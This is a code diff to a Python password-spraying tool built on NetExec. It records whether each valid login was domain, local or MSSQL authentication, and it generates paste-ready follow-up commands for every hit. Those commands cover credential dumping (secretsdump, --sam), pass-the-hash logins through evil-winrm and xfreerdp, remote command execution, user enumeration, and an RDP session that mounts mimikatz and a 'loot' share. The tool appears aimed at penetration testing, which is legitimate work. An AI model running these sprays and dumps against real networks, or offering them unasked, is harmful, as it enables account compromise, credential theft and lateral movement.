@@ -169,6 +169,21 @@ class Credential:
         return self.ntlm_hash
 
 
+def auth_mode_of(protocol: str, extra_args: list[str], label: str = "") -> str:
+    """How this attempt authenticated: domain, local, windows, mssql, internal."""
+    if label == "mssql-windows":
+        return "windows"
+    if label == "mssql-local":
+        return "mssql"
+    if label == "mssql-internal":
+        return "internal"
+    if "--local-auth" in extra_args:
+        return "local"
+    if protocol in LOCAL_AUTH_PROTOS:
+        return "domain"
+    return ""
+
+
 @dataclass
 class Hit:
     protocol: str
@@ -177,6 +192,20 @@ class Hit:
     status: str
     timestamp: str
     line: str = ""
+    extra_args: list[str] = field(default_factory=list)
+    label: str = ""
+    auth_mode: str = ""
+
+    def __post_init__(self) -> None:
+        if not self.auth_mode:
+            self.auth_mode = auth_mode_of(self.protocol, self.extra_args, self.label)
+
+    def uses_local_auth(self) -> bool:
+        if self.label == "mssql-windows":
+            return False
+        if self.label in {"mssql-local", "mssql-internal"}:
+            return True
+        return "--local-auth" in self.extra_args
 
     def as_json(self) -> dict:
         return {
@@ -186,6 +215,7 @@ class Hit:
             "pass": self.cred.password if not self.cred.secret_is_hash else None,
             "hash": self.cred.ntlm_hash,
             "status": self.status,
+            "auth_mode": self.auth_mode or None,
             "timestamp": self.timestamp,
         }
 
@@ -198,15 +228,14 @@ class Job:
     extra_args: list[str] = field(default_factory=list)
     label: str = ""  # e.g. mssql-windows / mssql-local / mssql-internal
 
+    def auth_mode(self) -> str:
+        return auth_mode_of(self.protocol, self.extra_args, self.label)
+
     def combo_label(self) -> str:
         """Human label for progress: protocol plus domain/local/mssql mode."""
-        if self.label:
-            mode = self.label[6:] if self.label.startswith("mssql-") else self.label
+        mode = self.auth_mode()
+        if mode:
             return f"{self.protocol} {mode}"
-        if "--local-auth" in self.extra_args:
-            return f"{self.protocol} local"
-        if self.protocol in LOCAL_AUTH_PROTOS:
-            return f"{self.protocol} domain"
         return self.protocol
 
 
@@ -700,12 +729,20 @@ def _status_from_line(line: str) -> str:
     return "valid"
 
 
-def parse_nxc_output(stdout: str, protocol: str, target: str, cred: Credential) -> tuple[list[Hit], bool]:
+def parse_nxc_output(
+    stdout: str,
+    protocol: str,
+    target: str,
+    cred: Credential,
+    extra_args: Optional[list[str]] = None,
+    label: str = "",
+) -> tuple[list[Hit], bool]:
     """Return (hits, account_locked). Never uses the process exit code."""
     text = strip_ansi(stdout or "")
     hits: list[Hit] = []
     locked = False
     best: Optional[Hit] = None
+    extra = list(extra_args or [])
 
     for raw_line in text.splitlines():
         line = raw_line.strip()
@@ -739,6 +776,8 @@ def parse_nxc_output(stdout: str, protocol: str, target: str, cred: Credential) 
             status=status,
             timestamp=utc_now(),
             line=line,
+            extra_args=list(extra),
+            label=label,
         )
         if best is None or STATUS_RANK.get(status, 1) > STATUS_RANK.get(best.status, 1):
             best = hit
@@ -1024,11 +1063,11 @@ def _shell_user(username: str) -> str:
     return sh_quote(username)
 
 
-def _auth_flags(cred: Credential) -> tuple[str, str]:
+def _auth_flags(cred: Credential, local: bool = False) -> tuple[str, str]:
     """Return (nxc_auth fragment, 'hash'|'password')."""
     u = _shell_user(cred.username)
     dflag = ""
-    if cred.domain and "\\" not in cred.username:
+    if not local and cred.domain and "\\" not in cred.username:
         dflag = f" -d {_shell_user(cred.domain)}"
     if cred.kind == "null":
         return f"-u '' -p ''{dflag}", "password"
@@ -1037,11 +1076,36 @@ def _auth_flags(cred: Credential) -> tuple[str, str]:
     return f"-u {u} -p {sh_quote(cred.password or '')}{dflag}", "password"
 
 
+def _nxc_cmd(proto: str, target: str, nxc_auth: str, local: bool, suffix: str = "") -> str:
+    local_flag = " --local-auth" if local else ""
+    extra = f" {suffix}" if suffix else ""
+    return f"nxc {proto} {target} {nxc_auth}{local_flag}{extra}".rstrip()
+
+
+def _rdp_pastable(hit: Hit) -> str:
+    cred = hit.cred
+    t = hit.target
+    u = cred.username or ""
+    d = cred.domain or ""
+    if cred.secret_is_hash:
+        secret = f"/pth:{cred.nt_hash_only()}"
+    else:
+        secret = f"/p:{sh_quote(cred.password or '')}"
+    return (
+        f'mkdir -p "$HOME/my_data/loot"; '
+        f"xfreerdp3 /clipboard /dynamic-resolution /cert:ignore "
+        f"/drive:'/usr/share/windows-resources/mimikatz/x64',share "
+        f'/drive:"$HOME/my_data/loot",loot '
+        f"/v:{t} /d:{d} /u:{u} {secret}"
+    )
+
+
 def pastables_for_hit(hit: Hit) -> list[str]:
     cred = hit.cred
     t = hit.target
     proto = hit.protocol
-    nxc_auth, kind = _auth_flags(cred)
+    local = hit.uses_local_auth()
+    nxc_auth, kind = _auth_flags(cred, local=local)
     u = cred.username or "''"
     p = sh_quote(cred.password or "")
     h = cred.ntlm_hash or ""
@@ -1053,61 +1117,54 @@ def pastables_for_hit(hit: Hit) -> list[str]:
     if proto == "smb":
         if kind == "hash":
             lines += [
-                f"nxc smb {t} {nxc_auth}",
-                f"nxc smb {t} {nxc_auth} --shares",
+                _nxc_cmd("smb", t, nxc_auth, local),
+                _nxc_cmd("smb", t, nxc_auth, local, "--shares"),
                 f"impacket-secretsdump {cred.username}@{t} -hashes {h}",
             ]
         else:
             lines += [
-                f"nxc smb {t} {nxc_auth} --shares",
-                f"nxc smb {t} {nxc_auth} --rid-brute",
+                _nxc_cmd("smb", t, nxc_auth, local, "--shares"),
             ]
+            if not local:
+                lines.append(_nxc_cmd("smb", t, nxc_auth, local, "--rid-brute"))
             if not low_priv:
-                lines += [
-                    f"nxc smb {t} {nxc_auth} --sam",
-                    f"nxc smb {t} {nxc_auth} --local-auth --shares",
-                ]
+                lines.append(_nxc_cmd("smb", t, nxc_auth, local, "--sam"))
     elif proto == "winrm":
         if kind == "hash":
             lines += [
                 f"evil-winrm -i {t} -u {u} -H {nth}",
-                f"nxc winrm {t} {nxc_auth}",
+                _nxc_cmd("winrm", t, nxc_auth, local),
             ]
         else:
             lines += [
                 f"evil-winrm -i {t} -u {u} -p {p}",
-                f"nxc winrm {t} {nxc_auth} -x whoami",
+                _nxc_cmd("winrm", t, nxc_auth, local, "-x whoami"),
             ]
     elif proto == "rdp":
-        if kind == "hash":
-            lines.append(f"xfreerdp /u:{u} /pth:{nth} /v:{t} /cert:ignore")
-        else:
-            lines.append(f"xfreerdp /u:{u} /p:{p} /v:{t} /cert:ignore")
+        lines.append(_rdp_pastable(hit))
     elif proto == "ssh":
         if kind != "hash":
             lines += [
                 f"ssh {u}@{t}",
-                f"nxc ssh {t} {nxc_auth}",
+                _nxc_cmd("ssh", t, nxc_auth, False),
             ]
     elif proto == "ftp":
         if kind != "hash":
-            lines.append(f"nxc ftp {t} {nxc_auth} --ls")
+            lines.append(_nxc_cmd("ftp", t, nxc_auth, False, "--ls"))
     elif proto == "ldap":
-        lines.append(f"nxc ldap {t} {nxc_auth}")
+        lines.append(_nxc_cmd("ldap", t, nxc_auth, False))
         if kind != "hash":
-            lines.append(f"nxc ldap {t} {nxc_auth} --users")
+            lines.append(_nxc_cmd("ldap", t, nxc_auth, False, "--users"))
     elif proto == "mssql":
-        lines.append(f"nxc mssql {t} {nxc_auth}")
+        lines.append(_nxc_cmd("mssql", t, nxc_auth, local))
         if kind != "hash":
-            lines.append(f"nxc mssql {t} {nxc_auth} --local-auth")
-            lines.append(f"nxc mssql {t} {nxc_auth} -x whoami")
+            lines.append(_nxc_cmd("mssql", t, nxc_auth, local, "-x whoami"))
     elif proto == "vnc":
         if kind != "hash":
-            lines.append(f"nxc vnc {t} {nxc_auth}")
+            lines.append(_nxc_cmd("vnc", t, nxc_auth, False))
     elif proto == "wmi":
-        lines.append(f"nxc wmi {t} {nxc_auth} -x whoami")
+        lines.append(_nxc_cmd("wmi", t, nxc_auth, local, "-x whoami"))
 
-    # de-dupe preserve order
     seen: set[str] = set()
     uniq: list[str] = []
     for line in lines:
@@ -1150,14 +1207,24 @@ def render_pastables(hits: list[Hit]) -> str:
                 proto_order.append(hit.protocol)
             by_proto[hit.protocol].append(hit)
         for proto in proto_order:
-            chunks.append(f"[{proto.upper()}]")
-            seen_cmd: set[str] = set()
+            mode_groups: dict[str, list[Hit]] = {}
+            mode_order: list[str] = []
             for hit in by_proto[proto]:
-                for cmd in pastables_for_hit(hit):
-                    if cmd not in seen_cmd:
-                        seen_cmd.add(cmd)
-                        chunks.append(f"  {cmd}")
-            chunks.append("")
+                mode = hit.auth_mode or ""
+                if mode not in mode_groups:
+                    mode_groups[mode] = []
+                    mode_order.append(mode)
+                mode_groups[mode].append(hit)
+            for mode in mode_order:
+                title = f"[{proto.upper()} {mode}]" if mode else f"[{proto.upper()}]"
+                chunks.append(title)
+                seen_cmd: set[str] = set()
+                for hit in mode_groups[mode]:
+                    for cmd in pastables_for_hit(hit):
+                        if cmd not in seen_cmd:
+                            seen_cmd.add(cmd)
+                            chunks.append(f"  {cmd}")
+                chunks.append("")
     chunks.append(bar)
     return "\n".join(chunks)
 
@@ -1243,6 +1310,7 @@ def build_jobs(
 HIT_COL_PROTO = 6
 HIT_COL_TARGET = 16
 HIT_COL_CREDS = 22
+HIT_COL_METHOD = 8
 
 
 ACCESS_LABEL = {
@@ -1280,16 +1348,18 @@ def hit_column_header() -> str:
     proto = "PROTO".ljust(HIT_COL_PROTO)
     target = "TARGET".ljust(HIT_COL_TARGET)
     creds = "CREDS".ljust(HIT_COL_CREDS)
-    return f"{C.dim}    {proto} | {target} | {creds} | ACCESS{C.reset}"
+    method = "METHOD".ljust(HIT_COL_METHOD)
+    return f"{C.dim}    {proto} | {target} | {creds} | {method} | ACCESS{C.reset}"
 
 
 def format_hit_line(hit: Hit) -> str:
     proto = hit.protocol.upper().ljust(HIT_COL_PROTO)
     target = hit.target.ljust(HIT_COL_TARGET)
     cred = hit.cred.display.ljust(HIT_COL_CREDS)
+    method = (hit.auth_mode or "-").ljust(HIT_COL_METHOD)
     status = format_hit_status(hit)
     proto_s = f"{C.yellow}{proto}{C.reset}"
-    return f"{C.green_bold}[+]{C.reset} {proto_s} | {target} | {cred} | {status}"
+    return f"{C.green_bold}[+]{C.reset} {proto_s} | {target} | {cred} | {method} | {status}"
 
 
 # ---------------------------------------------------------------------------
@@ -1594,7 +1664,14 @@ def run_spray(
                 + "\n"
                 + (stdout if stdout.endswith("\n") else stdout + "\n")
             )
-            found, locked = parse_nxc_output(stdout, job.protocol, job.target, job.cred)
+            found, locked = parse_nxc_output(
+                stdout,
+                job.protocol,
+                job.target,
+                job.cred,
+                extra_args=job.extra_args,
+                label=job.label,
+            )
             if locked:
                 lockout.mark_locked_out(job.target, job.cred)
             if found and args.stop_on_hit:
